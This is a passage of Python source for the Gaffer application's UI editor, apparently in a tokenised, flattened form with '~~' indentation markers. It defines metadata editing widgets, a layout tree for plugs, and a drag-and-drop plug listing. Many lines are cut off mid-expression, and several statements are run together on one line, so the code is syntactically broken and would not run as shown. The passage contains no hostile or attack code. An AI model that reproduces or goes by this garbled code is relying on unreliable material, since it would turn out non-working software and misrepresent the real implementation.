~~ if not Gaffer . match ( self . __target . relativeName ( self . __target . node ( ) ) , plugPath ) : \n 
~~~ return \n 
\n 
~~ self . __update ( ) \n 
\n 
~~ ~~ class _BoolMetadataWidget ( _MetadataWidget ) : \n 
\n 
~~~ def __init__ ( self , key , target = None , parenting = None ) : \n 
\n 
~~~ self . __boolWidget = GafferUI . BoolWidget ( ) \n 
_MetadataWidget . __init__ ( self , self . __boolWidget , key , target , parenting = parenting ) \n 
\n 
self . __stateChangedConnection = self . __boolWidget . stateChangedSignal ( ) . connect ( \n 
Gaffer . WeakMethod ( self . __stateChanged ) \n 
) \n 
\n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ self . __boolWidget . setState ( value if value is not None else False ) \n 
\n 
~~ def __stateChanged ( self , * unused ) : \n 
\n 
~~~ self . _updateFromWidget ( self . __boolWidget . getState ( ) ) \n 
\n 
~~ ~~ class _StringMetadataWidget ( _MetadataWidget ) : \n 
\n 
~~~ def __init__ ( self , key , target = None , acceptEmptyString = True , parenting = None ) : \n 
\n 
~~~ self . __textWidget = GafferUI . TextWidget ( ) \n 
_MetadataWidget . __init__ ( self , self . __textWidget , key , target , parenting = None ) \n 
\n 
self . __acceptEmptyString = acceptEmptyString \n 
\n 
self . __editingFinishedConnection = self . __textWidget . editingFinishedSignal ( ) . connect ( \n 
Gaffer . WeakMethod ( self . __editingFinished ) \n 
) \n 
\n 
~~ def textWidget ( self ) : \n 
\n 
~~~ return self . __textWidget \n 
\n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ self . __textWidget . setText ( value if value is not None else "" ) \n 
\n 
~~ def __editingFinished ( self , * unused ) : \n 
\n 
~~~ text = self . __textWidget . getText ( ) \n 
if text or self . __acceptEmptyString : \n 
~~~ self . _updateFromWidget ( text ) \n 
~~ else : \n 
~~~ self . _deregisterValue ( ) \n 
\n 
~~ ~~ ~~ class _MultiLineStringMetadataWidget ( _MetadataWidget ) : \n 
\n 
~~~ def __init__ ( self , key , target = None , parenting = None ) : \n 
\n 
~~~ self . __textWidget = GafferUI . MultiLineTextWidget ( ) \n 
_MetadataWidget . __init__ ( self , self . __textWidget , key , target , parenting = None ) \n 
\n 
self . __editingFinishedConnection = self . __textWidget . editingFinishedSignal ( ) . connect ( \n 
Gaffer . WeakMethod ( self . __editingFinished ) \n 
) \n 
\n 
~~ def textWidget ( self ) : \n 
\n 
~~~ return self . __textWidget \n 
\n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ self . __textWidget . setText ( value if value is not None else "" ) \n 
\n 
~~ def __editingFinished ( self , * unused ) : \n 
\n 
~~~ self . _updateFromWidget ( self . __textWidget . getText ( ) ) \n 
\n 
~~ ~~ class _ColorSwatchMetadataWidget ( _MetadataWidget ) : \n 
\n 
~~~ def __init__ ( self , key , target = None , parenting = None ) : \n 
\n 
~~~ self . __swatch = GafferUI . ColorSwatch ( useDisplayTransform = False ) \n 
\n 
_MetadataWidget . __init__ ( self , self . __swatch , key , target , parenting = parenting ) \n 
\n 
self . __swatch . _qtWidget ( ) . setFixedHeight ( 18 ) \n 
self . __swatch . _qtWidget ( ) . setMaximumWidth ( 40 ) \n 
self . __value = None \n 
\n 
self . __buttonReleaseConnection = self . __swatch . buttonReleaseSignal ( ) . connect ( Gaffer . WeakMethod ( self \n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ if value is not None : \n 
~~~ self . __swatch . setColor ( value ) \n 
~~ else : \n 
~~~ self . __swatch . setColor ( IECore . Color4f ( 0 , 0 , 0 , 0 ) ) \n 
\n 
~~ self . __value = value \n 
\n 
~~ def __buttonRelease ( self , swatch , event ) : \n 
\n 
~~~ if event . button != event . Buttons . Left : \n 
~~~ return False \n 
\n 
~~ color = self . __value if self . __value is not None else IECore . Color3f ( 1 ) \n 
dialogue = GafferUI . ColorChooserDialogue ( color = color , useDisplayTransform = False ) \n 
color = dialogue . waitForColor ( parentWindow = self . ancestor ( GafferUI . Window ) ) \n 
\n 
if color is not None : \n 
~~~ self . _updateFromWidget ( color ) \n 
\n 
~~ ~~ ~~ class _MenuMetadataWidget ( _MetadataWidget ) : \n 
\n 
~~~ def __init__ ( self , key , labelsAndValues , target = None , parenting = None ) : \n 
\n 
~~~ self . __menuButton = GafferUI . MenuButton ( \n 
menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __menuDefinition ) ) \n 
) \n 
\n 
self . __labelsAndValues = labelsAndValues \n 
self . __currentValue = None \n 
\n 
_MetadataWidget . __init__ ( self , self . __menuButton , key , target , parenting = parenting ) \n 
\n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ self . __currentValue = value \n 
\n 
buttonText = str ( value ) \n 
for label , value in self . __labelsAndValues : \n 
~~~ if value == self . __currentValue : \n 
~~~ buttonText = label \n 
break \n 
\n 
~~ ~~ self . __menuButton . setText ( buttonText ) \n 
\n 
~~ def __menuDefinition ( self ) : \n 
\n 
~~~ result = IECore . MenuDefinition ( ) \n 
for label , value in self . __labelsAndValues : \n 
~~~ result . append ( \n 
"/" + label , \n 
{ \n 
"command" : functools . partial ( Gaffer . WeakMethod ( self . __setValue ) , value = value ) , \n 
"checkBox" : value == self . __currentValue \n 
} \n 
) \n 
\n 
~~ return result \n 
\n 
~~ def __setValue ( self , unused , value ) : \n 
\n 
~~~ self . _updateFromWidget ( value ) \n 
\n 
########################################################################## \n 
# Hierarchical representation of a plug layout, suitable for manipulating \n 
# by the _PlugListing. \n 
# \\todo Consider sharing this data structure with the PlugLayout itself, \n 
# rather than each using a different internal representation. If we did \n 
# this then the data structure itself should take care of the mapping \n 
# to/from metadata. \n 
########################################################################## \n 
\n 
~~ ~~ class _LayoutItem ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ self . __parent = None \n 
self . __children = [ ] \n 
\n 
~~ def parent ( self ) : \n 
\n 
~~~ if self . __parent is None : \n 
~~~ return None \n 
~~ else : \n 
~~~ return self . __parent ( ) \n 
\n 
~~ ~~ def child ( self , name ) : \n 
\n 
~~~ for c in self . __children : \n 
~~~ if c . name ( ) == name : \n 
~~~ return c \n 
\n 
~~ ~~ return None \n 
\n 
~~ def isAncestorOf ( self , item ) : \n 
\n 
~~~ while item is not None : \n 
~~~ parent = item . parent ( ) \n 
if parent is self : \n 
~~~ return True \n 
~~ item = parent \n 
\n 
~~ return False \n 
\n 
~~ def append ( self , child ) : \n 
\n 
~~~ self . insert ( len ( self ) , child ) \n 
\n 
~~ def insert ( self , index , child ) : \n 
\n 
~~~ assert ( child . parent ( ) is None ) \n 
self . __children . insert ( index , child ) \n 
child . __parent = weakref . ref ( self ) \n 
\n 
~~ def remove ( self , child ) : \n 
\n 
~~~ assert ( child . parent ( ) is self ) \n 
\n 
self . __children . remove ( child ) \n 
child . __parent = None \n 
\n 
~~ def index ( self , child ) : \n 
\n 
~~~ return self . __children . index ( child ) \n 
\n 
~~ def name ( self ) : \n 
\n 
~~~ raise NotImplementedError \n 
\n 
~~ def fullName ( self ) : \n 
\n 
~~~ result = "" \n 
item = self \n 
while item . parent ( ) is not None : \n 
~~~ if result : \n 
~~~ result = item . name ( ) + "." + result \n 
~~ else : \n 
~~~ result = item . name ( ) \n 
~~ item = item . parent ( ) \n 
\n 
~~ return result \n 
\n 
~~ def __len__ ( self ) : \n 
\n 
~~~ return len ( self . __children ) \n 
\n 
~~ def __getitem__ ( self , index ) : \n 
\n 
~~~ return self . __children [ index ] \n 
\n 
~~ ~~ class _SectionLayoutItem ( _LayoutItem ) : \n 
\n 
~~~ def __init__ ( self , sectionName ) : \n 
\n 
~~~ _LayoutItem . __init__ ( self ) \n 
\n 
self . __sectionName = sectionName \n 
\n 
~~ def name ( self ) : \n 
\n 
~~~ return self . __sectionName \n 
\n 
~~ ~~ class _PlugLayoutItem ( _LayoutItem ) : \n 
\n 
~~~ def __init__ ( self , plug ) : \n 
\n 
~~~ _LayoutItem . __init__ ( self ) \n 
\n 
self . plug = plug \n 
self . __name = plug . getName ( ) \n 
\n 
~~ def name ( self ) : \n 
\n 
~~~ return self . __name \n 
\n 
########################################################################## \n 
# _PlugListing. This is used to list the plugs in the UIEditor, \n 
# organised into their respective sections. \n 
########################################################################## \n 
\n 
~~ ~~ class _PlugListing ( GafferUI . Widget ) : \n 
\n 
~~~ class __LayoutPath ( Gaffer . Path ) : \n 
\n 
~~~ def __init__ ( self , rootItem , path , root = "/" , filter = None ) : \n 
\n 
~~~ Gaffer . Path . __init__ ( self , path , root , filter ) \n 
\n 
self . __rootItem = rootItem \n 
\n 
~~ def rootItem ( self ) : \n 
\n 
~~~ return self . __rootItem \n 
\n 
~~ def item ( self ) : \n 
\n 
~~~ result = self . __rootItem \n 
for name in self : \n 
~~~ result = result . child ( name ) \n 
if result is None : \n 
~~~ return None \n 
\n 
~~ ~~ return result \n 
\n 
~~ def copy ( self ) : \n 
\n 
~~~ return self . __class__ ( self . __rootItem , self [ : ] , self . root ( ) , self . getFilter ( ) ) \n 
\n 
~~ def isLeaf ( self ) : \n 
\n 
~~~ return not isinstance ( self . item ( ) , _SectionLayoutItem ) \n 
\n 
~~ def isValid ( self ) : \n 
\n 
~~~ return self . item ( ) is not None \n 
\n 
~~ def _children ( self ) : \n 
\n 
~~~ item = self . item ( ) \n 
if item is None : \n 
~~~ return [ ] \n 
\n 
~~ result = [ \n 
self . __class__ ( self . __rootItem , self [ : ] + [ c . name ( ) ] , self . root ( ) , self . getFilter ( ) ) \n 
for c in item \n 
] \n 
\n 
# Add a placeholder child into empty sections, to be used as a drag target \n 
# in __dragMove() \n 
if len ( result ) == 0 and isinstance ( item , _SectionLayoutItem ) : \n 
~~~ result . append ( self . __class__ ( self . __rootItem , self [ : ] + [ " " ] , self . root ( ) , self . getFilter ( ) \n 
~~ return result \n 
\n 
~~ ~~ def __init__ ( self , parenting = None ) : \n 
\n 
~~~ column = GafferUI . ListContainer ( spacing = 4 ) \n 
GafferUI . Widget . __init__ ( self , column , parenting = parenting ) \n 
\n 
with column : \n 
\n 
~~~ self . __pathListing = GafferUI . PathListingWidget ( \n 
self . __LayoutPath ( _SectionLayoutItem ( "" ) , "/" ) , \n 
# listing displays the plug name and automatically sorts based on plug index \n 
columns = ( GafferUI . PathListingWidget . defaultNameColumn , ) , \n 
displayMode = GafferUI . PathListingWidget . DisplayMode . Tree , \n 
) \n 
\n 
self . __pathListing . setDragPointer ( "" ) \n 
self . __pathListing . setSortable ( False ) \n 
self . __pathListing . setHeaderVisible ( False ) \n 
\n 
with GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal , spacing = 4 ) : \n 
\n 
~~~ GafferUI . MenuButton ( \n 
image = "plus.png" , \n 
hasFrame = False , \n 
menu = GafferUI . Menu ( \n 
definition = Gaffer . WeakMethod ( self . __addMenuDefinition ) \n 
) \n 
) \n 
\n 
self . __deleteButton = GafferUI . Button ( image = "minus.png" , hasFrame = False ) \n 
self . __deleteButtonClickedConnection = self . __deleteButton . clickedSignal ( ) . connect ( Gaffer . WeakMethod \n 
~~ ~~ self . __parent = None \n 
self . __dragItem = None \n 
self . __selectionChangedSignal = Gaffer . Signal1 ( ) \n 
\n 
self . __dragEnterConnection = self . __pathListing . dragEnterSignal ( ) . connect ( Gaffer . WeakMethod ( self self . __dragMoveConnection = self . __pathListing . dragMoveSignal ( ) . connect ( Gaffer . WeakMethod ( self . __dragMove self . __dragEndConnection = self . __pathListing . dragEndSignal ( ) . connect ( Gaffer . WeakMethod ( self . __dragEnd self . __selectionChangedConnection = self . __pathListing . selectionChangedSignal ( ) . connect ( Gaffer . WeakMethod self . __keyPressConnection = self . keyPressSignal ( ) . connect ( Gaffer . WeakMethod ( self . __keyPress ) ) \n 
\n 
self . __nodeMetadataChangedConnection = Gaffer . Metadata . nodeValueChangedSignal ( ) . connect ( Gaffer . WeakMethod self . __plugMetadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( Gaffer . WeakMethod \n 
~~ def setPlugParent ( self , parent ) : \n 
\n 
~~~ assert ( isinstance ( parent , ( Gaffer . Plug , Gaffer . Node , types . NoneType ) ) ) \n 
\n 
self . __parent = parent \n 
\n 
self . __childAddedConnection = None \n 
self . __childRemovedConnection = None \n 
self . __childNameChangedConnections = { } \n 
\n 
if self . __parent is not None : \n 
~~~ self . __childAddedConnection = self . __parent . childAddedSignal ( ) . connect ( Gaffer . WeakMethod ( self . __childAddedOrRemoved self . __childRemovedConnection = self . __parent . childRemovedSignal ( ) . connect ( Gaffer . WeakMethod ( self for child in self . __parent . children ( ) : \n 
~~~ self . __updateChildNameChangedConnection ( child ) \n 
\n 
~~ ~~ self . __updatePath ( ) \n 
\n 
~~ def getPlugParent ( self ) : \n 
\n 
~~~ return self . __parent \n 
\n 
# Selection can be None, a Plug, or the name of a section. \n 
~~ def setSelection ( self , selection ) : \n 
\n 
~~~ self . __updatePathLazily . flush ( self ) \n 
\n 
def findPlugPath ( path , plug ) : \n 
\n 
~~~ item = path . item ( ) \n 
if isinstance ( item , _PlugLayoutItem ) and item . plug . isSame ( plug ) : \n 
~~~ return path \n 
~~ else : \n 
~~~ for child in path . children ( ) : \n 
~~~ r = findPlugPath ( child , plug ) \n 
if r is not None : \n 
~~~ return r \n 
~~ ~~ return None \n 
\n 
~~ ~~ if isinstance ( selection , Gaffer . Plug ) : \n 
~~~ path = findPlugPath ( self . __pathListing . getPath ( ) , selection ) \n 
if path is None : \n 
~~~ self . __pathListing . setSelectedPaths ( [ ] ) \n 
~~ else : \n 
~~~ self . __pathListing . setSelectedPaths ( [ path ] ) \n 
~~ ~~ elif isinstance ( selection , basestring ) : \n 
~~~ path = self . __pathListing . getPath ( ) . copy ( ) \n 
path [ : ] = selection . split ( "." ) \n 
self . __pathListing . setSelectedPaths ( [ path ] ) \n 
~~ else : \n 
~~~ assert ( selection is None ) \n 
self . __pathListing . setSelectedPaths ( [ ] ) \n 
\n 
~~ ~~ def getSelection ( self ) : \n 
\n 
~~~ item = self . __selectedItem ( ) \n 
if item is None : \n 
~~~ return None \n 
~~ elif isinstance ( item , _PlugLayoutItem ) : \n 
~~~ return item . plug \n 
~~ elif isinstance ( item , _SectionLayoutItem ) : \n 
~~~ return item . fullName ( ) \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ def selectionChangedSignal ( self ) : \n 
\n 
~~~ return self . __selectionChangedSignal \n 
\n 
# Updates the path we show in the listing by building a layout based \n 
# on the metadata. \n 
~~ def __updatePath ( self ) : \n 
\n 
~~~ if self . __parent is None : \n 
# we have nothing to show - early out. \n 
~~~ self . __pathListing . setPath ( self . __LayoutPath ( _SectionLayoutItem ( "" ) , "/" ) ) \n 
return \n 
\n 
~~ def section ( rootLayoutItem , sectionPath ) : \n 
\n 
~~~ sectionItem = rootLayoutItem \n 
if sectionPath != "" : \n 
~~~ for sectionName in sectionPath . split ( "." ) : \n 
~~~ childSectionItem = sectionItem . child ( sectionName ) \n 
if childSectionItem is None : \n 
~~~ childSectionItem = _SectionLayoutItem ( sectionName ) \n 
sectionItem . append ( childSectionItem ) \n 
~~ sectionItem = childSectionItem \n 
\n 
~~ ~~ return sectionItem \n 
\n 
~~ layout = _SectionLayoutItem ( "" ) \n 
for sectionPath in GafferUI . PlugLayout . layoutSections ( self . __parent ) : \n 
~~~ if sectionPath == "User" and isinstance ( self . __parent , Gaffer . Node ) : \n 
~~~ continue \n 
~~ sectionItem = section ( layout , sectionPath ) \n 
for plug in GafferUI . PlugLayout . layoutOrder ( self . __parent , section = sectionPath ) : \n 
~~~ sectionItem . append ( _PlugLayoutItem ( plug ) ) \n 
\n 
~~ ~~ emptySections = _metadata ( self . getPlugParent ( ) , "uiEditor:emptySections" ) \n 
emptySectionIndices = _metadata ( self . getPlugParent ( ) , "uiEditor:emptySectionIndices" ) \n 
if emptySections and emptySectionIndices : \n 
~~~ for sectionPath , sectionIndex in zip ( emptySections , emptySectionIndices ) : \n 
~~~ parentPath , unused , sectionName = sectionPath . rpartition ( "." ) \n 
parentSection = section ( layout , parentPath ) \n 
if parentSection . child ( sectionName ) is None : \n 
~~~ parentSection . insert ( sectionIndex , _SectionLayoutItem ( sectionName ) ) \n 
\n 
~~ ~~ ~~ if len ( layout ) == 0 and isinstance ( self . __parent , Gaffer . Node ) : \n 
~~~ layout . append ( _SectionLayoutItem ( "Settings" ) ) \n 
\n 
~~ expandedPaths = self . __pathListing . getExpandedPaths ( ) \n 
self . __pathListing . setPath ( self . __LayoutPath ( layout , "/" ) ) \n 
self . __pathListing . setExpandedPaths ( expandedPaths ) \n 
\n 
~~ @ GafferUI . LazyMethod ( ) \n 
def __updatePathLazily ( self ) : \n 
\n 
~~~ self . __updatePath ( ) \n 
\n 
# Updates the metadata that controls the plug layout from the layout \n 
# we show in the listing. \n 
~~ def __updateMetadata ( self ) : \n 
\n 
# Because sections only really exist by virtue of being requested \n 
# by a plug, we must store empty sections separately for ourselves. \n 
\n 
~~~ emptySections = IECore . StringVectorData ( ) \n 
emptySectionIndices = IECore . IntVectorData ( ) \n 
def walk ( layoutItem , path = "" , index = 0 ) : \n 
\n 
~~~ for childItem in layoutItem : \n 
~~~ if isinstance ( childItem , _PlugLayoutItem ) : \n 
~~~ Gaffer . Metadata . registerPlugValue ( childItem . plug , "layout:section" , path ) \n 
Gaffer . Metadata . registerPlugValue ( childItem . plug , "layout:index" , index ) \n 
index += 1 \n 
~~ elif isinstance ( childItem , _SectionLayoutItem ) : \n 
~~~ childPath = path + "." + childItem . name ( ) if path else childItem . name ( ) \n 
if len ( childItem ) : \n 
~~~ index = walk ( childItem , childPath , index ) \n 
~~ else : \n 
~~~ emptySections . append ( childPath ) \n 
emptySectionIndices . append ( layoutItem . index ( childItem ) ) \n 
\n 
~~ ~~ ~~ return index \n 
\n 
~~ with Gaffer . BlockedConnection ( self . __plugMetadataChangedConnection ) : \n 
~~~ walk ( self . __pathListing . getPath ( ) . copy ( ) . setFromString ( "/" ) . item ( ) ) \n 
_registerMetadata ( self . getPlugParent ( ) , "uiEditor:emptySections" , emptySections ) \n 
_registerMetadata ( self . getPlugParent ( ) , "uiEditor:emptySectionIndices" , emptySectionIndices ) \n 
\n 
~~ ~~ def __childAddedOrRemoved ( self , parent , child ) : \n 
\n 
~~~ assert ( parent . isSame ( self . __parent ) ) \n 
\n 
self . __updateChildNameChangedConnection ( child ) \n 
self . __updatePathLazily ( ) \n 
\n 
~~ def __childNameChanged ( self , child ) : \n 
\n 
~~~ selection = self . getSelection ( ) \n 
self . __updatePath ( ) \n 
if isinstance ( selection , Gaffer . Plug ) and child . isSame ( selection ) : \n 
\n 
# keep it selected is different too, so we have to manually \n 
# restore the selection. \n 
~~~ self . setSelection ( selection ) \n 
\n 
~~ ~~ def __updateChildNameChangedConnection ( self , child ) : \n 
\n 
~~~ if self . __parent . isSame ( child . parent ( ) ) : \n 
~~~ if child not in self . __childNameChangedConnections : \n 
~~~ self . __childNameChangedConnections [ child ] = child . nameChangedSignal ( ) . connect ( Gaffer . WeakMethod ~~ ~~ else : \n 
~~~ if child in self . __childNameChangedConnections : \n 
~~~ del self . __childNameChangedConnections [ child ] \n 
\n 
~~ ~~ ~~ def __dragEnter ( self , listing , event ) : \n 
\n 
# accept the drag if it originates with us, \n 
# so __dragMove and __drop can implement \n 
# drag and drop reordering of plugs. \n 
~~~ if event . sourceWidget is not self . __pathListing : \n 
~~~ return False \n 
~~ if not isinstance ( event . data , IECore . StringVectorData ) : \n 
~~~ return False \n 
\n 
~~ dragPath = self . __pathListing . getPath ( ) . copy ( ) . setFromString ( event . data [ 0 ] ) \n 
self . __dragItem = dragPath . item ( ) \n 
\n 
\n 
self . __pathListing . setPathExpanded ( dragPath , False ) \n 
\n 
return True \n 
\n 
~~ def __dragMove ( self , listing , event ) : \n 
\n 
~~~ if self . __dragItem is None : \n 
~~~ return False \n 
\n 
# update our layout structure to reflect the drag \n 
################################################# \n 
\n 
# find newParent and newIndex - variables specifying \n 
# the new location for the dragged item. \n 
~~ targetPath = self . __pathListing . pathAt ( event . line . p0 ) \n 
if targetPath is not None : \n 
~~~ targetItem = targetPath . item ( ) \n 
if targetItem is not None : \n 
~~~ if isinstance ( targetItem , _SectionLayoutItem ) and self . __pathListing . getPathExpanded ( targetPath ~~~ newParent = targetItem \n 
newIndex = 0 \n 
~~ else : \n 
~~~ newParent = targetItem . parent ( ) \n 
newIndex = newParent . index ( targetItem ) \n 
~~ ~~ else : \n 
# target is a placeholder added into an empty \n 
# section by __LayoutPath._children(). \n 
~~~ newParent = targetPath . copy ( ) . truncateUntilValid ( ) . item ( ) \n 
newIndex = 0 \n 
~~ ~~ else : \n 
# drag has gone above or below all listed items \n 
~~~ newParent = self . __pathListing . getPath ( ) . rootItem ( ) \n 
newIndex = 0 if event . line . p0 . y < 1 else len ( newParent ) \n 
\n 
# skip any attempted circular reparenting \n 
\n 
~~ if newParent is self . __dragItem or self . __dragItem . isAncestorOf ( newParent ) : \n 
~~~ return True \n 
\n 
# disallow drags that would place a plug below a section \n 
\n 
~~ firstNonPlugIndex = next ( \n 
( x [ 0 ] for x in enumerate ( newParent ) if not isinstance ( x [ 1 ] , _PlugLayoutItem ) ) , \n 
len ( newParent ) \n 
) \n 
if self . __dragItem . parent ( ) is newParent and newParent . index ( self . __dragItem ) < firstNonPlugIndex ~~~ firstNonPlugIndex -= 1 \n 
\n 
~~ if isinstance ( self . __dragItem , _PlugLayoutItem ) : \n 
~~~ if newIndex > firstNonPlugIndex : \n 
~~~ return True \n 
~~ ~~ else : \n 
~~~ if newIndex < firstNonPlugIndex : \n 
~~~ newIndex = max ( newIndex , firstNonPlugIndex ) \n 
\n 
~~ ~~ self . __dragItem . parent ( ) . remove ( self . __dragItem ) \n 
newParent . insert ( newIndex , self . __dragItem ) \n 
\n 
\n 
# we need to update the selection, because when we reparented \n 
# the drag item its path will have changed. \n 
############################################################## \n 
\n 
self . __pathListing . getPath ( ) . pathChangedSignal ( ) ( self . __pathListing . getPath ( ) ) \n 
\n 
selection = self . __pathListing . getPath ( ) . copy ( ) \n 
selection [ : ] = self . __dragItem . fullName ( ) . split ( "." ) \n 
self . __pathListing . setSelectedPaths ( [ selection ] , scrollToFirst = False , expandNonLeaf = False ) \n 
return True \n 
\n 
~~ def __dragEnd ( self , listing , event ) : \n 
\n 
~~~ if self . __dragItem is None : \n 
~~~ return False \n 
\n 
~~ with Gaffer . UndoContext ( self . __parent . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ self . __updateMetadata ( ) \n 
~~ self . __dragItem = None \n 
\n 
return True \n 
\n 
~~ def __selectionChanged ( self , pathListing ) : \n 
\n 
~~~ self . __deleteButton . setEnabled ( bool ( pathListing . getSelectedPaths ( ) ) ) \n 
self . __selectionChangedSignal ( self ) \n 
\n 
~~ def __deleteButtonClicked ( self , button ) : \n 
\n 
~~~ self . __deleteSelected ( ) \n 
\n 
~~ def __nodeMetadataChanged ( self , nodeTypeId , key , node ) : \n 
\n 
~~~ if self . __parent is None : \n 
~~~ return \n 
\n 
~~ if node is not None and not self . __parent . isSame ( node ) : \n 
~~~ return \n 
\n 
~~ if not self . __parent . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ if key in ( "uiEditor:emptySections" , "uiEditor:emptySectionIndices" ) : \n 
~~~ self . __updatePathLazily ( ) \n 
\n 
~~ ~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if self . __parent is None : \n 
~~~ return \n 
\n 
~~ if plug is not None and not self . __parent . isSame ( plug ) and not self . __parent . isSame ( plug . parent ~~~ return \n 
\n 
~~ node = self . __parent . node ( ) if isinstance ( self . __parent , Gaffer . Plug ) else self . __parent \n 
if not node . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ if key in ( "layout:index" , "layout:section" , "uiEditor:emptySections" , "uiEditor:emptySectionIndices" ~~~ self . __updatePathLazily ( ) \n 
\n 
~~ ~~ def __keyPress ( self , widget , event ) : \n 
\n 
~~~ assert ( widget is self ) \n 
\n 
if event . key == "Backspace" or event . key == "Delete" : \n 
~~~ self . __deleteSelected ( ) \n 
\n 
return True \n 
\n 
~~ return False \n 
\n 
~~ def __addMenuDefinition ( self ) : \n 
\n 
~~~ m = IECore . MenuDefinition ( ) \n 
\n 
m . append ( "/Add Plug/Bool" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , m . append ( "/Add Plug/Float" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , m . append ( "/Add Plug/Int" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , Gaffer m . append ( "/Add Plug/NumericDivider" , { "divider" : True } ) \n 
\n 
m . append ( "/Add Plug/String" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) m . append ( "/Add Plug/StringDivider" , { "divider" : True } ) \n 
\n 
m . append ( "/Add Plug/V2i" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , Gaffer m . append ( "/Add Plug/V3i" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , Gaffer m . append ( "/Add Plug/V2f" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , Gaffer m . append ( "/Add Plug/V3f" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug ) , Gaffer m . append ( "/Add Plug/VectorDivider" , { "divider" : True } ) \n 
\n 
m . append ( "/Add Plug/Color3f" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug m . append ( "/Add Plug/Color4f" , { "command" : functools . partial ( Gaffer . WeakMethod ( self . __addPlug \n 
m . append ( "/Add Plug Divider" , { "divider" : True } ) \n 
\n 
m . append ( "/Add Section" , { "command" : Gaffer . WeakMethod ( self . __addSection ) } ) \n 
\n 
return m \n 
\n 
~~ def __addPlug ( self , plugType ) : \n 
\n 
~~~ plug = plugType ( flags = Gaffer . Plug . Flags . Default | Gaffer . Plug . Flags . Dynamic ) \n 
_registerMetadata ( plug , "nodule:type" , "" ) \n 
\n 
parentItem = self . __selectedItem ( ) \n 
if parentItem is not None : \n 
~~~ while not isinstance ( parentItem , _SectionLayoutItem ) : \n 
~~~ parentItem = parentItem . parent ( ) \n 
~~ ~~ else : \n 
~~~ parentItem = self . __pathListing . getPath ( ) . rootItem ( ) \n 
parentItem = next ( \n 
( c for c in parentItem if isinstance ( c , _SectionLayoutItem ) ) , \n 
parentItem \n 
) \n 
\n 
~~ _registerMetadata ( plug , "layout:section" , parentItem . fullName ( ) ) \n 
\n 
with Gaffer . UndoContext ( self . __parent . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ self . getPlugParent ( ) . addChild ( plug ) \n 
\n 
~~ self . __updatePathLazily . flush ( self ) \n 
self . setSelection ( plug ) \n 
\n 
~~ def __addSection ( self ) : \n 
\n 
~~~ rootItem = self . __pathListing . getPath ( ) . rootItem ( ) \n 
existingSectionNames = set ( c . name ( ) for c in rootItem if isinstance ( c , _SectionLayoutItem ) ) \n 
\n 
name = "New Section" \n 
index = 1 \n 
while name in existingSectionNames : \n 
~~~ name = "New Section %d" % index \n 
index += 1 \n 
\n 
~~ rootItem . append ( _SectionLayoutItem ( name ) ) \n 
\n 
self . __pathListing . getPath ( ) . pathChangedSignal ( ) ( self . __pathListing . getPath ( ) ) \n 
\n 
with Gaffer . UndoContext ( self . __parent . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ self . __updateMetadata ( ) \n 
\n 
~~ self . __pathListing . setSelectedPaths ( \n 
self . __pathListing . getPath ( ) . copy ( ) . setFromString ( "/" + name ) \n 
) \n 
\n 
~~ def __selectedItem ( self ) : \n 
\n 
~~~ selectedPaths = self . __pathListing . getSelectedPaths ( ) \n 
if not len ( selectedPaths ) : \n 
~~~ return None \n 
\n 
~~ assert ( len ( selectedPaths ) == 1 ) \n 
\n 
return selectedPaths [ 0 ] . item ( ) \n 
\n 
~~ def __deleteSelected ( self ) : \n 
\n 
~~~ selectedItem = self . __selectedItem ( ) \n 
if selectedItem is None : \n 
~~~ return \n 
\n 
~~ selectedItem . parent ( ) . remove ( selectedItem ) \n 
\n 
def deletePlugsWalk ( item ) : \n 
\n 
~~~ if isinstance ( item , _PlugLayoutItem ) : \n 
~~~ item . plug . parent ( ) . removeChild ( item . plug ) \n 
~~ else : \n 
~~~ for childItem in item : \n 
~~~ deletePlugsWalk ( childItem ) \n 
\n 
~~ ~~ ~~ with Gaffer . UndoContext ( self . __parent . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ deletePlugsWalk ( selectedItem ) \n 
self . __updateMetadata ( ) \n 
\n 
########################################################################## \n 
# _PresetsEditor. This provides a ui for editing the presets for a plug. \n 
########################################################################## \n 
\n 
~~ ~~ ~~ class _PresetsEditor ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self , parenting = None ) : \n 
\n 
~~~ row = GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal , spacing = 8 ) \n 
GafferUI . Widget . __init__ ( self , row , parenting = parenting ) \n 
\n 
with row : \n 
\n 
~~~ with GafferUI . ListContainer ( spacing = 4 ) : \n 
\n 
~~~ self . __pathListing = GafferUI . PathListingWidget ( \n 
Gaffer . DictPath ( collections . OrderedDict ( ) , "/" ) , \n 
columns = ( GafferUI . PathListingWidget . defaultNameColumn , ) , \n 
) \n 
self . __pathListing . setDragPointer ( "" ) \n 
self . __pathListing . setSortable ( False ) \n 
self . __pathListing . setHeaderVisible ( False ) \n 
self . __pathListing . _qtWidget ( ) . setFixedWidth ( 200 ) \n 
self . __pathListing . _qtWidget ( ) . setFixedHeight ( 200 ) \n 
\n 
